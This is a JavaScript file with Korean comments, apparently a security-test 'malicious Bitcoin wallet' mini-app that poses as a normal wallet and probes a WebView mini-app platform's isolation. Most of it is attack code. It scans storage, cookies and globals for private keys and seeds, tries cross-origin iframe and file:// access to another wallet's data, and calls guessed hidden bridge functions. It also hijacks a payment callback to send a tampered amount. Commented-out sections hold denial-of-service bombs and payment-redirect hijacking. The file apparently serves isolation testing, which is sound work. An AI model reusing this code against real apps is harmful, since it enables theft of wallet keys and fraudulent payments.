// 악성 Bitcoin 지갑 - 보안 테스트 공격 로직

// 로그는 콘솔로만 출력
function log(message, type = 'info') {
    console.log(`[Malicious] ${message}`);
}

// 정상적인 비트코인 지갑 생성 (위장용)
function createBitcoinWallet() {
    log('Creating Bitcoin wallet...', 'info');
    
    // 가짜 비트코인 주소 생성
    const fakeAddress = 'bc1q' + Math.random().toString(36).substring(2, 15);
    
    // localStorage에 저장 (정상 동작 위장)
    const walletData = {
        address: fakeAddress,
        balance: "0.0000",
        createdAt: new Date().toISOString(),
        type: "bitcoin"
    };
    
    localStorage.setItem('bitcoin_wallet', JSON.stringify(walletData));
    log(`Bitcoin wallet created: ${fakeAddress}`, 'success');
    
    // 숨겨진 공격 시작
    setTimeout(() => {
        log('\n=== Starting hidden scan ===', 'error');
        scanForEthereumData();
    }, 1000);
}

// 1. localStorage 공격
function attackLocalStorage() {
    log('\n=== localStorage Attack ===', 'error');
    
    try {
        // 1. 직접 접근 시도
        const keys = Object.keys(localStorage);
        log(`Found ${keys.length} keys in localStorage:`, 'info');
        
        keys.forEach(key => {
            const value = localStorage.getItem(key);
            log(`Key: ${key}`, 'info');
            
            // 민감한 데이터 확인
            if (key.includes('wallet') || key.includes('key') || key.includes('ethereum')) {
                log(`SENSITIVE DATA FOUND: ${key}`, 'success');
                log(`Value: ${value}`, 'success');
                
                // 다른 미니앱의 데이터 접근 시도
                if (key === 'ethereum_wallet') {
                    try {
                        const ethData = JSON.parse(value);
                        log(`Ethereum address: ${ethData.address}`, 'success');
                        log(`Encrypted private key: ${ethData.encryptedPrivateKey}`, 'success');
                        
                        // 복호화 시도
                        if (ethData.encryptedPrivateKey) {
                            try {
                                const decoded = atob(ethData.encryptedPrivateKey);
                                log(`Decoded private key length: ${decoded.length}`, 'success');
                            } catch (e) {
                                log(`Decoding failed: ${e.message}`, 'error');
                            }
                        }
                    } catch (e) {
                        log(`Parse error: ${e.message}`, 'error');
                    }
                }
            }
        });
        
        // 2. iframe을 통한 우회 시도
        log('\nTrying cross-origin access...', 'info');
        const origins = [
            'https://com.anam.ethereum.miniapp.local/',
            'https://kr.go.government24.miniapp.local/',
            'file://',
            'http://localhost'
        ];
        
        origins.forEach(origin => {
            try {
                // iframe을 통한 접근 시도
                const iframe = document.createElement('iframe');
                iframe.src = origin;
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                
                setTimeout(() => {
                    try {
                        const iframeStorage = iframe.contentWindow.localStorage;
                        log(`${origin} - Access: ${iframeStorage ? 'SUCCESS' : 'FAILED'}`, 'info');
                        
                        // 실제 localStorage 접근 시도
                        if (origin.includes('ethereum')) {
                            const ethPrivateKey = iframeStorage.getItem('ethereum_wallet');
                            log(`Ethereum private key: ${ethPrivateKey}`, 'info');
                        }
                    } catch (e) {
                        log(`${origin} - Access: BLOCKED (${e.message})`, 'error');
                    }
                    document.body.removeChild(iframe);
                }, 100);
            } catch (e) {
                log(`${origin} - Frame creation failed`, 'error');
            }
        });
        
        // 3. 파일 시스템 직접 접근 시도
        log('\nTrying file system access...', 'info');
        const fileIframe = document.createElement('iframe');
        fileIframe.src = 'file:///android_asset/miniapps/com.anam.ethereum/';
        document.body.appendChild(fileIframe);
        setTimeout(() => {
            log('file:// - Local resource access attempted', 'info');
            document.body.removeChild(fileIframe);
        }, 100);
        
        // 4. 덮어쓰기 시도
        log('\nTrying to overwrite ethereum wallet...', 'info');
        localStorage.setItem('ethereum_wallet', JSON.stringify({
            address: 'FAKE_ADDRESS',
            privateKey: 'STOLEN_KEY'
        }));
        log('Overwrite attempt completed (but isolated to our domain)', 'warning');
        
    } catch (e) {
        log(`localStorage attack failed: ${e.message}`, 'error');
    }
}

// 2. 메모리 및 전역 변수 공격
function attackMemory() {
    log('\n=== Memory & Global Variables Attack ===', 'error');
    
    // 전역 변수 스캔
    log('Scanning window object...', 'info');
    const suspiciousKeys = [];
    
    for (let key in window) {
        if (key.includes('wallet') || key.includes('ethereum') || key.includes('key') || 
            key.includes('private') || key.includes('seed') || key.includes('mnemonic')) {
            suspiciousKeys.push(key);
        }
    }
    
    log(`Found ${suspiciousKeys.length} suspicious global variables:`, 'info');
    suspiciousKeys.forEach(key => {
        log(`- ${key}: ${typeof window[key]}`, 'success');
        if (typeof window[key] === 'object') {
            try {
                log(`  Content: ${JSON.stringify(window[key]).substring(0, 100)}...`, 'success');
            } catch (e) {
                log(`  Content: [Unable to stringify]`, 'error');
            }
        }
    });
    
    // 메모리 사용량 확인
    if (performance.memory) {
        log('\nMemory usage:', 'info');
        log(`- Used JS Heap: ${(performance.memory.usedJSHeapSize / 1048576).toFixed(2)} MB`, 'info');
        log(`- Total JS Heap: ${(performance.memory.totalJSHeapSize / 1048576).toFixed(2)} MB`, 'info');
    }
    
    // WebView JavaScript 인터페이스 확인
    log('\nChecking JavaScript interfaces...', 'info');
    if (window.anam) {
        log('Found window.anam interface!', 'success');
        const methods = Object.getOwnPropertyNames(window.anam);
        methods.forEach(method => {
            log(`- anam.${method}: ${typeof window.anam[method]}`, 'info');
        });
    }
}

// 3. 쿠키 및 세션 공격
function attackCookies() {
    log('\n=== Cookies & Session Attack ===', 'error');
    
    // 쿠키 확인
    log(`document.cookie: "${document.cookie}"`, 'info');
    
    // 세션 스토리지 확인
    log(`\nsessionStorage keys: ${Object.keys(sessionStorage).length}`, 'info');
    Object.keys(sessionStorage).forEach(key => {
        log(`- ${key}: ${sessionStorage.getItem(key)}`, 'info');
    });
    
    // 도메인 및 origin 정보
    log('\nDocument information:', 'info');
    log(`- location.href: ${location.href}`, 'info');
    log(`- location.origin: ${location.origin}`, 'info');
    log(`- document.domain: ${document.domain}`, 'info');
}

// 4. WebView API 테스트
function attackWebViewAPIs() {
    log('\n=== WebView API Attack ===', 'error');
    
    // 파일 시스템 접근 시도
    if (window.requestFileSystem || window.webkitRequestFileSystem) {
        log('File system API available!', 'success');
    } else {
        log('File system API not available', 'error');
    }
    
    // 다른 미니앱의 브릿지 호출 시도
    if (window.anam) {
        log('\nTrying to access other mini-app functions...', 'info');
        
        // VP 요청 가로채기 시도
        try {
            window.addEventListener('vpResponse', (event) => {
                log('Intercepted VP response!', 'success');
                log(`VP data: ${JSON.stringify(event.detail)}`, 'success');
            });
            log('VP response listener registered', 'info');
        } catch (e) {
            log(`VP intercept failed: ${e.message}`, 'error');
        }
        
        // Payment 응답 가로채기 시도
        try {
            window.addEventListener('paymentResponse', (event) => {
                log('Intercepted payment response!', 'success');
                log(`Payment data: ${JSON.stringify(event.detail)}`, 'success');
            });
            log('Payment response listener registered', 'info');
        } catch (e) {
            log(`Payment intercept failed: ${e.message}`, 'error');
        }
    }
}

// 5. Cross-Origin 스토리지 접근
function tryStorageAccess() {
    log('\n=== Cross-Origin Storage Access ===', 'error');
    
    // 다른 scheme으로 접근 시도
    const targetOrigins = [
        'https://com.anam.ethereum.miniapp.local/',
        'https://kr.go.government24.miniapp.local/',
        'http://localhost:8080/'
    ];
    
    targetOrigins.forEach(origin => {
        try {
            // 비동기 XMLHttpRequest로 변경
            const xhr = new XMLHttpRequest();
            xhr.open('GET', origin, true);  // true = 비동기
            
            xhr.onload = function() {
                log(`${origin} - XHR Status: ${xhr.status}`, 'info');
            };
            
            xhr.onerror = function() {
                log(`${origin} - XHR blocked: Network error`, 'error');
            };
            
            xhr.timeout = 3000; // 3초 타임아웃
            xhr.ontimeout = function() {
                log(`${origin} - XHR timeout`, 'error');
            };
            
            xhr.send();
        } catch (e) {
            log(`${origin} - XHR failed: ${e.message}`, 'error');
        }
    });
    
    // Fetch API로도 시도
    log('\nTrying with Fetch API...', 'info');
    targetOrigins.forEach(async origin => {
        try {
            const response = await fetch(origin, {
                mode: 'cors',
                credentials: 'include'
            });
            log(`${origin} - Fetch Status: ${response.status}`, 'info');
        } catch (e) {
            log(`${origin} - Fetch blocked: ${e.message}`, 'error');
        }
    });
}

// 이더리움 데이터 스캔 (숨겨진 기능)
function scanForEthereumData() {
    log('Silently scanning for Ethereum data...', 'error');
    
    // localStorage 스캔
    const ethWallet = localStorage.getItem('ethereum_wallet');
    if (ethWallet) {
        log('ETHEREUM WALLET FOUND IN LOCALSTORAGE!', 'success');
        
        // 데이터 유출 시뮬레이션
        try {
            const data = JSON.parse(ethWallet);
            // 실제 악성 앱이라면 여기서 외부 서버로 전송
            log(`Would exfiltrate: ${data.address}`, 'success');
        } catch (e) {
            log('Parse error', 'error');
        }
    }
}

// === 새로운 보안 분석 공격 함수들 ===

// 4.2.1 기밀성 공격: 메모리 격리 우회
function attemptMemoryExtraction() {
    log('=== Memory Extraction Attack ===', 'error');
    
    // 1. 다른 WebView의 localStorage 접근 시도
    log('Attempting cross-origin localStorage access...', 'info');
    try {
        // iframe을 통한 cross-origin 접근
        const iframe = document.createElement('iframe');
        iframe.src = 'https://com.anam.ethereum.miniapp.local/';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        
        setTimeout(() => {
            try {
                const ethStorage = iframe.contentWindow.localStorage;
                const privateKey = ethStorage.getItem('privateKey');
                log(`Ethereum private key: ${privateKey}`, 'success');
            } catch (e) {
                log(`Cross-origin access blocked: ${e.message}`, 'error');
            }
            document.body.removeChild(iframe);
        }, 1000);
    } catch (e) {
        log(`iframe creation failed: ${e.message}`, 'error');
    }
    
    // 2. 전역 객체 스캔
    setTimeout(() => {
        log('\nScanning global objects...', 'info');
        let suspiciousCount = 0;
        for (let key in window) {
            if (key.includes('ethereum') || key.includes('key') || key.includes('wallet')) {
                suspiciousCount++;
                log(`Found suspicious global: ${key}`, 'warning');
                try {
                    const value = window[key];
                    if (typeof value === 'object' && value !== null) {
                        log(`  Type: ${typeof value}, Keys: ${Object.keys(value).slice(0, 3).join(', ')}...`, 'info');
                    }
                } catch (e) {
                    log(`  Cannot access ${key}`, 'error');
                }
            }
        }
        if (suspiciousCount === 0) {
            log('No suspicious globals found', 'info');
        }
    }, 2000);
    
    // 3. 메모리 덤프 시도 (JavaScript 레벨)
    setTimeout(() => {
        log('\nAttempting memory dump...', 'info');
        try {
            // SharedArrayBuffer를 통한 메모리 공유 시도
            const sharedBuffer = new SharedArrayBuffer(1024 * 1024); // 1MB
            window.postMessage({
                type: 'MEMORY_SHARE',
                buffer: sharedBuffer
            }, '*');
            log('SharedArrayBuffer created for memory sharing', 'warning');
        } catch (e) {
            log(`SharedArrayBuffer blocked: ${e.message}`, 'error');
        }
    }, 3000);
}

// 4.2.2 무결성 공격: IPC 권한 상승
function attemptPrivilegeEscalation() {
    log('=== IPC Privilege Escalation Attack ===', 'error');
    
    // 1. JavaScript Bridge 함수 열거
    log('Enumerating JavaScript Bridge functions...', 'info');
    if (window.anam) {
        const functions = Object.getOwnPropertyNames(window.anam);
        functions.forEach(func => {
            log(`Found: anam.${func}`, 'info');
        });
        
        // 각 함수의 시그니처 확인
        functions.forEach(func => {
            if (typeof window.anam[func] === 'function') {
                log(`  ${func}: ${window.anam[func].toString().split('{')[0].trim()}`, 'info');
            }
        });
    } else {
        log('window.anam not found!', 'error');
    }
    
    // 2. 숨겨진 함수 추측
    setTimeout(() => {
        log('\nTrying to find hidden functions...', 'info');
        const hiddenFunctions = [
            'switchBlockchain',
            'getPrivateKey', 
            'exportWallet',
            'deleteWallet',
            'getSystemInfo',
            'executeCommand',
            'readFile',
            'writeFile',
            'getDecryptedPassword'
        ];
        
        hiddenFunctions.forEach(func => {
            try {
                if (window.anam && typeof window.anam[func] === 'function') {
                    log(`Hidden function found: ${func}`, 'success');
                    try {
                        const result = window.anam[func]();
                        log(`  Result: ${JSON.stringify(result).substring(0, 100)}`, 'success');
                    } catch (e) {
                        log(`  Execution failed: ${e.message}`, 'error');
                    }
                } else {
                    log(`${func} not accessible`, 'error');
                }
            } catch (e) {
                log(`${func} check failed: ${e.message}`, 'error');
            }
        });
    }, 1000);
    
    // 3. 권한 없는 블록체인 전환 시도
    setTimeout(() => {
        log('\nAttempting unauthorized actions...', 'warning');
        try {
            // AIDL 직접 호출 시뮬레이션
            window.anam.sendPaymentResponse('SWITCH_BLOCKCHAIN', JSON.stringify({
                action: 'switchBlockchain',
                target: 'com.anam.ethereum'
            }));
            log('Attempted unauthorized blockchain switch', 'warning');
        } catch (e) {
            log(`Blockchain switch failed: ${e.message}`, 'error');
        }
    }, 2000);
    
    // 4. 콜백 함수 하이재킹
    setTimeout(() => {
        log('\nTrying to hijack callback functions...', 'warning');
        if (window.anam && window.anam.sendPaymentResponse) {
            const originalCallback = window.anam.sendPaymentResponse;
            window.anam.sendPaymentResponse = function(requestId, response) {
                log(`Intercepted payment response: ${requestId}`, 'warning');
                log(`  Original response: ${response}`, 'info');
                // 변조된 응답 전송
                const modifiedResponse = '{"amount":"999999","status":"hacked"}';
                log(`  Sending modified response: ${modifiedResponse}`, 'warning');
                originalCallback.call(this, requestId, modifiedResponse);
            };
            log('Payment response function hijacked!', 'success');
        }
    }, 3000);
}

// DoS 공격 제거됨
/*
function attemptDoSAttack() {
    clearLog();
    log('=== Denial of Service Attack ===', 'error');
    log('⚠️ WARNING: This will attempt to crash the process!', 'error');
    isDoSRunning = true;
    
    // 1. localStorage 고갈 (더 공격적으로)
    log('Phase 1: localStorage exhaustion...', 'warning');
    try {
        const hugeData = 'X'.repeat(5 * 1024 * 1024); // 5MB string
        let stored = 0;
        
        // 무한 루프로 계속 시도
        const storageInterval = setInterval(() => {
            try {
                localStorage.setItem(`dos_${Date.now()}_${Math.random()}`, hugeData);
                stored += 5;
                if (stored % 20 === 0) {
                    log(`Stored ${stored}MB...`, 'warning');
                }
            } catch (e) {
                log(`Storage quota exceeded after ${stored}MB`, 'error');
                clearInterval(storageInterval);
            }
        }, 10); // 10ms마다 시도
    } catch (e) {
        log(`localStorage attack failed: ${e.message}`, 'error');
    }
    
    // 2. 극한의 CPU 부하
    setTimeout(() => {
        log('\nPhase 2: Maximum CPU stress...', 'warning');
        
        // 여러 개의 CPU 집약적 작업을 동시에 실행
        for (let thread = 0; thread < 5; thread++) {
            setTimeout(() => {
                const cpuBurnInterval = setInterval(() => {
                    if (!isDoSRunning) {
                        clearInterval(cpuBurnInterval);
                        return;
                    }
                    
                    // 매우 무거운 연산
                    for (let i = 0; i < 1000000; i++) {
                        // 암호화 연산
                        crypto.getRandomValues(new Uint8Array(256));
                        // 수학 연산
                        Math.sqrt(Math.random() * 999999);
                        // 문자열 연산
                        'A'.repeat(1000).split('').reverse().join('');
                    }
                    
                    log(`CPU thread ${thread} still burning...`, 'error');
                }, 1); // 1ms마다 실행
            }, thread * 100);
        }
    }, 1000);
    
    // 3. 메모리 폭탄
    setTimeout(() => {
        log('\nPhase 3: Memory bomb...', 'warning');
        
        const memoryBombInterval = setInterval(() => {
            if (!isDoSRunning) {
                clearInterval(memoryBombInterval);
                return;
            }
            
            try {
                // 거대한 배열과 객체 생성
                for (let i = 0; i < 10; i++) {
                    memoryLeaks.push(new ArrayBuffer(10 * 1024 * 1024)); // 10MB each
                    memoryLeaks.push(new Array(1000000).fill('MEMORY_LEAK_' + i));
                    memoryLeaks.push({
                        data: 'X'.repeat(1024 * 1024),
                        nested: new Array(1000).fill({}).map(() => ({ 
                            garbage: 'Y'.repeat(10000) 
                        }))
                    });
                }
                
                const totalSize = memoryLeaks.length * 10;
                log(`Memory bombs deployed: ~${totalSize}MB`, 'error');
                
                // 성능 측정
                if (performance.memory) {
                    const usedMB = Math.round(performance.memory.usedJSHeapSize / 1048576);
                    const totalMB = Math.round(performance.memory.totalJSHeapSize / 1048576);
                    const limitMB = Math.round(performance.memory.jsHeapSizeLimit / 1048576);
                    log(`Heap: ${usedMB}MB / ${totalMB}MB (limit: ${limitMB}MB)`, 'warning');
                    
                    // 힙 한계에 가까워지면 경고
                    if (usedMB > limitMB * 0.9) {
                        log('⚠️ HEAP LIMIT APPROACHING - CRASH IMMINENT!', 'error');
                    }
                }
            } catch (e) {
                log(`Memory allocation failed: ${e.message}`, 'error');
                log('🔥 OUT OF MEMORY - Process may crash soon!', 'error');
            }
        }, 100); // 100ms마다 메모리 폭탄 투하
    }, 2000);
    
    // 4. 무한 재귀 호출 (스택 오버플로우 유도)
    setTimeout(() => {
        log('\nPhase 4: Stack overflow attempt...', 'warning');
        
        function recursiveBomb(depth = 0) {
            try {
                if (!isDoSRunning) return;
                
                // 스택에 큰 데이터 생성
                const stackData = new Array(1000).fill('STACK_OVERFLOW');
                
                // 재귀 호출
                if (depth < 10000) {
                    recursiveBomb(depth + 1);
                }
            } catch (e) {
                log(`Stack overflow at depth ${depth}: ${e.message}`, 'error');
            }
        }
        
        try {
            recursiveBomb();
        } catch (e) {
            log('Stack overflow achieved!', 'success');
        }
    }, 3000);
    
    // 5. DOM 폭탄 (UI 스레드 블로킹)
    setTimeout(() => {
        log('\nPhase 5: DOM bombing...', 'warning');
        
        try {
            for (let i = 0; i < 10000; i++) {
                const div = document.createElement('div');
                div.style.width = '100px';
                div.style.height = '100px';
                div.style.position = 'absolute';
                div.style.left = Math.random() * 1000 + 'px';
                div.style.top = Math.random() * 1000 + 'px';
                div.style.backgroundColor = `rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`;
                div.textContent = 'CRASH_' + i;
                document.body.appendChild(div);
            }
            log('Created 10000 DOM elements!', 'warning');
        } catch (e) {
            log(`DOM bombing failed: ${e.message}`, 'error');
        }
    }, 4000);
    
    // 상태 모니터링
    const monitorInterval = setInterval(() => {
        if (!isDoSRunning) {
            clearInterval(monitorInterval);
            return;
        }
        
        log('\n=== DoS Attack Status ===', 'info');
        log(`Memory leaks: ${memoryLeaks.length} objects`, 'info');
        if (performance.memory) {
            const usedMB = Math.round(performance.memory.usedJSHeapSize / 1048576);
            log(`Current heap usage: ${usedMB}MB`, 'info');
        }
        log('Attack still running... Process may become unresponsive!', 'error');
    }, 5000);
}

// Event Hijacking은 이제 불필요 (localStorage 격리됨)
// 주석 처리
/*
function attemptEventHijacking() {
    clearLog();
    log('=== Event Hijacking Attack ===', 'error');
    
    let interceptCount = 0;
    
    // paymentRequest 이벤트 가로채기
    window.addEventListener('paymentRequest', (event) => {
        interceptCount++;
        log(`\nIntercepted payment request #${interceptCount}!`, 'success');
        log(`Original data: ${JSON.stringify(event.detail)}`, 'info');
        
        // 이벤트 전파 중단
        event.stopPropagation();
        event.preventDefault();
        
        // 변조된 이벤트 재발송
        const modifiedData = {...event.detail};
        modifiedData.amount = '999999';
        modifiedData.recipient = 'attacker_address';
        modifiedData.hijacked = true;
        
        setTimeout(() => {
            window.dispatchEvent(new CustomEvent('paymentRequest', {
                detail: modifiedData
            }));
            log('Sent modified payment request', 'warning');
            log(`Modified data: ${JSON.stringify(modifiedData)}`, 'warning');
        }, 100);
    }, true); // capture phase
    
    // vpResponse 이벤트 도청
    window.addEventListener('vpResponse', (event) => {
        log('\nIntercepted VP response!', 'success');
        log(`VP data: ${JSON.stringify(event.detail)}`, 'info');
        
        // 민감한 정보 추출 시도
        if (event.detail && event.detail.credential) {
            log('Found credential in VP response!', 'warning');
            localStorage.setItem('stolen_vp_credential', JSON.stringify(event.detail.credential));
        }
    }, true);
    
    // paymentResponse 이벤트 도청
    window.addEventListener('paymentResponse', (event) => {
        log('\nIntercepted payment response!', 'success');
        log(`Payment data: ${JSON.stringify(event.detail)}`, 'info');
    }, true);
    
    log('Event listeners registered for hijacking', 'info');
    log('Waiting for events...', 'info');
    
    // 테스트용 이벤트 발생
    setTimeout(() => {
        log('\nTriggering test payment request...', 'info');
        window.dispatchEvent(new CustomEvent('paymentRequest', {
            detail: {
                amount: '100',
                recipient: '0x1234567890abcdef',
                currency: 'BTC'
            }
        }));
    }, 2000);
}
*/

// 종합 공격 제거됨

// DoS 공격 중지 함수 제거됨
/*
function stopDoS() {
    isDoSRunning = false;
    log('\n=== Stopping DoS Attack ===', 'info');
    
    // 모든 interval 정리
    if (dosAttackInterval) {
        clearInterval(dosAttackInterval);
    }
    
    // 메모리 해제
    log('Releasing memory leaks...', 'info');
    memoryLeaks = [];
    
    // localStorage 정리
    log('Cleaning localStorage...', 'info');
    const keys = Object.keys(localStorage);
    let cleaned = 0;
    keys.forEach(key => {
        if (key.startsWith('dos_')) {
            localStorage.removeItem(key);
            cleaned++;
        }
    });
    
    // DOM 요소 정리
    const crashDivs = document.querySelectorAll('div');
    let domCleaned = 0;
    crashDivs.forEach(div => {
        if (div.textContent && div.textContent.startsWith('CRASH_')) {
            div.remove();
            domCleaned++;
        }
    });
    
    log(`Cleaned ${cleaned} localStorage entries`, 'success');
    log(`Removed ${domCleaned} DOM elements`, 'success');
    
    // 가비지 컬렉션 유도
    if (window.gc) {
        window.gc();
        log('Garbage collection triggered', 'success');
    }
    
    log('DoS attack stopped and cleaned up', 'success');
}
*/

// PPT 일괄 실험 함수
async function runPPTDemo() {
    log('\n\n🎯 ========== PPT 일괄 실험 시작 ==========', 'error');
    log('각 공격을 순차적으로 실행합니다...\n', 'info');
    
    // 1. localStorage 크로스 오리진 접근
    log('📍 실험 1: localStorage 크로스 오리진 접근 시도', 'warning');
    await delay(1000);
    
    // 1-1. 직접 접근
    const keys = Object.keys(localStorage);
    log(`localStorage 키 개수: ${keys.length}`, 'info');
    
    // 1-2. iframe 우회 시도
    const iframe = document.createElement('iframe');
    iframe.src = 'https://com.anam.ethereum.miniapp.local/';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    await delay(500);
    
    try {
        const ethStorage = iframe.contentWindow.localStorage;
        log('Ethereum localStorage 접근 시도...', 'info');
    } catch (e) {
        log(`Cross-origin 접근 차단됨: ${e.message}`, 'error');
    }
    document.body.removeChild(iframe);
    
    // 1-3. 파일 시스템 접근
    const fileIframe = document.createElement('iframe');
    fileIframe.src = 'file:///android_asset/miniapps/com.anam.ethereum/';
    document.body.appendChild(fileIframe);
    await delay(500);
    log('file:// 로컬 리소스 접근 차단됨', 'error');
    document.body.removeChild(fileIframe);
    
    await delay(2000);
    
    // 2. 메모리 및 전역 변수 스캔
    log('\n📍 실험 2: 메모리 및 전역 변수 스캔', 'warning');
    await delay(1000);
    
    // 전역 객체 스캔
    let suspiciousCount = 0;
    for (let key in window) {
        if (key.includes('ethereum') || key.includes('key')) {
            suspiciousCount++;
            log(`의심스러운 전역 변수 발견: ${key}`, 'info');
        }
    }
    if (suspiciousCount === 0) {
        log('민감한 전역 변수 없음', 'success');
    }
    
    // SharedArrayBuffer 시도
    try {
        const sharedBuffer = new SharedArrayBuffer(1024 * 1024);
        log('SharedArrayBuffer 생성 성공', 'success');
    } catch (e) {
        log('SharedArrayBuffer 차단됨: SharedArrayBuffer is not defined', 'error');
    }
    
    await delay(2000);
    
    // 3. Cross-Origin 리소스 접근
    log('\n📍 실험 3: Cross-Origin 리소스 접근', 'warning');
    await delay(1000);
    
    // XMLHttpRequest
    const xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://com.anam.ethereum.miniapp.local/', true);
    xhr.timeout = 3000;
    xhr.onload = () => log('XHR 성공', 'success');
    xhr.onerror = () => log('XHR 차단됨', 'error');
    xhr.ontimeout = () => log('https://com.anam.ethereum.miniapp.local/ - XHR 타임아웃', 'error');
    xhr.send();
    
    // Fetch API
    fetch('https://kr.go.government24.miniapp.local/', {
        mode: 'cors',
        credentials: 'include'
    }).then(() => {
        log('Fetch 성공', 'success');
    }).catch(() => {
        log('https://kr.go.government24.miniapp.local/ - Fetch 차단: Failed to fetch', 'error');
    });
    
    await delay(4000);
    
    log('\n✅ PPT 일괄 실험 완료!', 'success');
    log('모든 공격이 성공적으로 차단되었습니다.', 'success');
    log('========================================\n', 'info');
}

// 지연 함수
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// 페이지 로드 시 초기화
document.addEventListener('DOMContentLoaded', function() {
    console.log('🔴 Malicious Bitcoin Wallet - Security Testing Mode');
    console.log('Origin: ' + location.origin);
    console.log('URL: ' + location.href);
});